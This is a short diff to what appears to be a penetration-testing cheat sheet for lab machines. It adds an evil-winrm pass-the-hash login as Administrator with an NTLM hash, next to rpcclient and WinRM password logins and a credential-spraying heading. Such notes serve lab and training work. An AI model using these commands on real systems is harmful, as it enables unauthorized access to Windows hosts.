@@ -53,6 +53,8 @@ rpcclient -U 's.smith%password' 10.10.10.182
 # winrm - default port: 5985
 evil-winrm -i 10.10.10.182 -u 's.smith' -p 'password'
 
+# winrm with pass the hash (omit the LM part)
+evil-winrm -i 10.10.10.175 -u 'Administrator' -H d9485863c1e9e05851aa40cbb4ab9dff
 ```
 
 ## Credential Spray
